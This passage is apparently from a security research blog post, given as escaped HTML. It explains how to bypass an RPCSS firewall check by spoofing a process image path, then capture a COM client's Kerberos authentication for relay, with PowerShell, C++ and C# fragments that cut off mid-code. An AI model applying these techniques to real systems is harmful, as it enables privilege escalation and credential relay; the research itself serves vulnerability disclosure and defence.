standard OBJREF. I&amp;#39;ve left out the code for the marshalling and parsing of the OBJREF, but much of that is already present in the linked &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;. We then modify the list of string bindings to only include a TCP binding for 127.0.0.1, forcing the OXID resolver to use TCP. If you specify a computer&amp;#39;s hostname then the OXID resolver will use ALPC instead. Note that the string bindings in the OBJREF are only for binding to the OXID resolver, not the COM server itself.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;We can then convert the modified OBJREF into an &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-createobjrefmoniker"&gt;objref moniker&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This &lt;/span&gt;&lt;span&gt;format is useful as it allows us to trivially unmarshal the object in another process by calling the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.bindtomoniker"&gt;Marshal::BindToMoniker&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;API in .NET and passing the moniker string. For example to bind to the COM object in PowerShell you can run the following command:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.aa280acd79392ba85d8386c23bd09616ceb0921a"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c7"&gt;[&lt;/span&gt;&lt;span class="c12 c24"&gt;Runtime.InteropServices.Marshal&lt;/span&gt;&lt;span class="c7"&gt;]::&lt;/span&gt;&lt;span class="c12"&gt;BindToMoniker(&lt;/span&gt;&lt;span class="c12 c14"&gt;&amp;quot;objref:TUVP...:&amp;quot;&lt;/span&gt;&lt;span class="c12"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Immediately after binding to the moniker a firewall dialog is likely to appear as shown:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEgybhFzqvgfEdl6sb2UHO07AeGInMwLXo9Naj4ped7m9_nAgpjLAmxNCtkrIg3NcG7UG-H_OvjqrFYm5pJDI9vT26tz3hvbsXGdTMD-35sLIyPeGMCcF0pvMY3_TBWsaKd9VNxGWySPukIkRe-xeMVMccdI_hvQ_6vPW-2Er7IfGf8qE8USwxI_MpczUw=s790" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEgybhFzqvgfEdl6sb2UHO07AeGInMwLXo9Naj4ped7m9_nAgpjLAmxNCtkrIg3NcG7UG-H_OvjqrFYm5pJDI9vT26tz3hvbsXGdTMD-35sLIyPeGMCcF0pvMY3_TBWsaKd9VNxGWySPukIkRe-xeMVMccdI_hvQ_6vPW-2Er7IfGf8qE8USwxI_MpczUw=s790" border="0" alt="Firewall dialog for the COM server when a TCP binding is created" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;This is requesting the user to allow our COM server process access to listen on all network interfaces for incoming connections. This prompt only appears when the client tries to resolve the OXID as DCOM supports dynamic RPC endpoints. Initially when the COM server starts it only listens on ALPC, but the RPCSS service can ask the server to bind to additional endpoints.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This request is made through an internal RPC interface that every COM server implements for use by the RPCSS service. One of the functions on this interface is &lt;/span&gt;&lt;span class="c4"&gt;UseProtSeq&lt;/span&gt;&lt;span&gt;, which requests that the COM server enables a TCP endpoint. When the COM server receives the &lt;/span&gt;&lt;span class="c4"&gt;UseProtSeq &lt;/span&gt;&lt;span class="c9"&gt;call it tries to bind a TCP server to all interfaces, which subsequently triggers the Windows Defender Firewall to prompt the user for access. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Enabling the firewall permission requires administrator privileges. However, as we only need to listen for connections via localhost we shouldn&amp;#39;t need to modify the firewall so the dialog can be dismissed safely. However, going back to the COM client we&amp;#39;ll see an error reported.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f650b0d01b77aecef2325462507e753c659f0187"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;Exception calling &amp;quot;BindToMoniker&amp;quot; with &amp;quot;1&amp;quot; argument(s): &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;quot;The RPC server is unavailable. (Exception from HRESULT: 0x800706BA)&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;If we allow our COM server executable through the firewall, the client is able to connect over TCP successfully. Clearly the firewall is affecting the behavior of the COM client in some way even though it shouldn&amp;#39;t. Tracing through the unmarshalling process in the COM client, the error is being returned from RPCSS when trying to resolve the OXID&amp;#39;s binding information. This would imply that no connection attempt is made, and RPCSS is detecting that the COM server wouldn&amp;#39;t be allowed through the firewall and refusing to return any binding information for TCP.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Further digging into RPCSS led me to the following function:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.adfd20381e0d0a060d62f6d9e908c9386f1297f0"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;BOOL IsPortOpen&lt;/span&gt;&lt;span class="c3"&gt;(&lt;/span&gt;&lt;span class="c11"&gt;LPWSTR ImageFileName&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;int&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;PortNumber&lt;/span&gt;&lt;span class="c3"&gt;)&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3 c17"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; INetFwMgr&lt;/span&gt;&lt;span class="c3"&gt;*&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;mgr&lt;/span&gt;&lt;span class="c3 c17"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6 c33"&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; CoCreateInstance&lt;/span&gt;&lt;span class="c3"&gt;(&lt;/span&gt;&lt;span class="c11"&gt;CLSID_FwMgr&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16 c13"&gt;NULL&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;CLSCTX_INPROC_SERVER&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c6 c33"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;IID_PPV_ARGS&lt;/span&gt;&lt;span class="c3"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c11"&gt;mgr&lt;/span&gt;&lt;span class="c3 c17"&gt;));&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; VARIANT Allowed&lt;/span&gt;&lt;span class="c3 c17"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; VARIANT Restricted&lt;/span&gt;&lt;span class="c3 c17"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; mgr&lt;/span&gt;&lt;span class="c3"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c11"&gt;IsPortAllowed&lt;/span&gt;&lt;span class="c3"&gt;(&lt;/span&gt;&lt;span class="c11"&gt;ImageFileName&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;NET_FW_IP_VERSION_ANY&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c6 c33"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PortNumber&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16 c13"&gt;NULL&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;NET_FW_IP_PROTOCOL_TCP&lt;/span&gt;&lt;span class="c3 c17"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c11"&gt;Allowed&lt;/span&gt;&lt;span class="c3"&gt;,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c11"&gt;Restricted&lt;/span&gt;&lt;span class="c3 c17"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16 c13"&gt;if&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;(&lt;/span&gt;&lt;span class="c11"&gt;VT_BOOL &lt;/span&gt;&lt;span class="c3"&gt;!=&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;Allowed&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;span class="c11"&gt;vt&lt;/span&gt;&lt;span class="c3 c17"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c13 c16"&gt;return&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="c3 c17"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c3 c17"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16 c13"&gt;return&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;Allowed&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;span class="c11"&gt;boolVal &lt;/span&gt;&lt;span class="c3"&gt;==&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;VARIANT_TRUE&lt;/span&gt;&lt;span class="c3 c17"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This function uses the &lt;/span&gt;&lt;span class="c4"&gt;HNetCfg.FwMgr&lt;/span&gt;&lt;span&gt;&amp;nbsp;COM object, and calls &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/netfw/nf-netfw-inetfwmgr-isportallowed"&gt;INetFwMgr::IsPortAllowed&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;to determine if the process is allowed to listen on the specified TCP port. This function is called for every TCP binding when enumerating the COM server&amp;#39;s bindings to return to the client. RPCSS passes the full path to the COM server&amp;#39;s executable and the listening TCP port. If the function returns FALSE then RPCSS doesn&amp;#39;t consider it valid and won&amp;#39;t add it to the list of potential bindings. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;If the OXID resolving process doesn&amp;#39;t have any binding at the end of the lookup process it will return the &lt;/span&gt;&lt;span class="c4"&gt;RPC_S_SERVER_UNAVAILABLE&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;error and the COM client will fail to bind to the server. How can we get around this limitation without needing administrator privileges to allow our server through the firewall? We can convert this C++ code into a small PowerShell function to test the behavior of the function to see what would grant access.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.8dadc02f2dd955da5d84ce378d816be40d1bf022"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c12 c30"&gt;function&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c28"&gt;Test-IsPortOpen&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c30"&gt;param&lt;/span&gt;&lt;span class="c6"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c7"&gt;[&lt;/span&gt;&lt;span class="c12 c24"&gt;string&lt;/span&gt;&lt;span class="c7"&gt;]&lt;/span&gt;&lt;span class="c8"&gt;$Name&lt;/span&gt;&lt;span class="c7 c17"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c7"&gt;[&lt;/span&gt;&lt;span class="c12 c24"&gt;int&lt;/span&gt;&lt;span class="c7"&gt;]&lt;/span&gt;&lt;span class="c8 c17"&gt;$Port&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;$mgr&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c7"&gt;=&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;New-Object&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c32"&gt;-ComObject&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c17 c14"&gt;&amp;quot;HNetCfg.FwMgr&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;$allow&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c7"&gt;=&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17"&gt;$null&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;$mgr&lt;/span&gt;&lt;span class="c7"&gt;.&lt;/span&gt;&lt;span class="c12"&gt;IsPortAllowed(&lt;/span&gt;&lt;span class="c8"&gt;$Name&lt;/span&gt;&lt;span class="c7"&gt;,&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c18"&gt;2&lt;/span&gt;&lt;span class="c7"&gt;,&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;$Port&lt;/span&gt;&lt;span class="c7"&gt;,&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c14"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="c7"&gt;,&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c18"&gt;6&lt;/span&gt;&lt;span class="c7"&gt;,&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c7"&gt;[&lt;/span&gt;&lt;span class="c12 c24"&gt;ref&lt;/span&gt;&lt;span class="c7"&gt;]&lt;/span&gt;&lt;span class="c8"&gt;$allow&lt;/span&gt;&lt;span class="c7"&gt;,&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;$null&lt;/span&gt;&lt;span class="c6"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8 c17"&gt;$allow&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c30"&gt;foreach&lt;/span&gt;&lt;span class="c12"&gt;(&lt;/span&gt;&lt;span class="c8"&gt;$f&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c30"&gt;in&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;$(&lt;/span&gt;&lt;span class="c12 c13"&gt;ls&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c14"&gt;&amp;quot;$env:WINDIR\system32\*.exe&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;)) { &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c30"&gt;if&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c12 c13"&gt;Test-IsPortOpen&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;$f&lt;/span&gt;&lt;span class="c7"&gt;.&lt;/span&gt;&lt;span class="c12"&gt;FullName &lt;/span&gt;&lt;span class="c12 c18"&gt;12345&lt;/span&gt;&lt;span class="c6"&gt;) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;Write-Host&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;$f&lt;/span&gt;&lt;span class="c7"&gt;.&lt;/span&gt;&lt;span class="c6"&gt;Fullname&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This script enumerates all executable files in system32 and checks if they&amp;#39;d be allowed to connect to TCP port 12345. Normally the TCP port would be selected automatically, however the COM server can use the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserveruseprotseqep"&gt;RpcServerUseProtseqEp&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;API to pre-register a known TCP port for RPC communication, so we&amp;#39;ll just pick port 12345.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The only executable in system32 that returns true from &lt;/span&gt;&lt;span class="c4"&gt;Test-IsPortOpen&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class="c4"&gt;svchost.exe&lt;/span&gt;&lt;span class="c9"&gt;. That makes some sense, the default firewall rules usually permit a limited number of services to be accessible through the firewall, the majority of which are hosted in a shared service process.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This check doesn&amp;#39;t guarantee a COM server will be allowed through the firewall, just that it&amp;#39;s potentially accessible in order to return a TCP binding string. As the connection will be via localhost we don&amp;#39;t need to be allowed through the firewall, only that &lt;/span&gt;&lt;span class="c4"&gt;IsPortOpen &lt;/span&gt;&lt;span class="c9"&gt;thinks we could be open. How can we spoof the image filename?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The obvious trick would be to create a &lt;/span&gt;&lt;span class="c4"&gt;svchost.exe&lt;/span&gt;&lt;span&gt;&amp;nbsp;process and inject our own code in there. However, that is harder to achieve through pure .NET code and also injecting into an &lt;/span&gt;&lt;span class="c4"&gt;svchost &lt;/span&gt;&lt;span class="c9"&gt;executable is a bit of a red flag if something is monitoring for malicious code which might make the exploit unreliable. Instead, perhaps we can influence the image filename used by RPCSS?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;Digging into the COM runtime, when a COM server registers itself with RPCSS it passes its own image filename as part of the registration information. The runtime gets the image filename through a call to &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamew"&gt;GetModuleFileName&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which gets the value from the &lt;/span&gt;&lt;span class="c4"&gt;ImagePathName&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field in the process parameters block referenced by the PEB. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;We can modify this string in our own process to be anything we like, then when COM is initialized, that will be sent to RPCSS which will use it for the firewall check. Once the check passes, RPCSS will return the TCP string bindings for our COM server when unmarshalling the OBJREF and the client will be able to connect. This can all be done with only minor in-process modifications from .NET and no external servers required.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c23" id="h.87n38litfqxj"&gt;&lt;span class="c25 c17"&gt;Capturing Authentication&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;At this point a new RPC connection will be made to our process to communicate with the marshaled COM object. During that process the COM client must authenticate, so we can capture and relay that authentication to another service locally or remotely. What&amp;#39;s the best way to capture that authentication traffic?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;Before we do anything we need to select what authentication we want to receive, and this will be reflected in the OBJREF&amp;#39;s security bindings. As we&amp;#39;re doing everything using the existing COM runtime we can register what RPC authentication services to use when calling &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity"&gt;CoInitializeSecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the COM server through the &lt;/span&gt;&lt;span class="c4"&gt;asAuthSvc&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;parameter.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5188af134394dbd4e93278caa48ce70cc2e7b4b8"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;var&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;svcs = &lt;/span&gt;&lt;span class="c12 c13"&gt;new&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;SOLE_AUTHENTICATION_SERVICE[] { &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;&amp;nbsp; &amp;nbsp; new&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;SOLE_AUTHENTICATION_SERVICE() { &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; dwAuthnSvc = RpcAuthenticationType.Kerberos,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; pPrincipalName = &lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;HOST/DC.domain.com&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;var&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;str = SetProcessModuleName(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;System&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c17 c13"&gt;try&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp;CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span 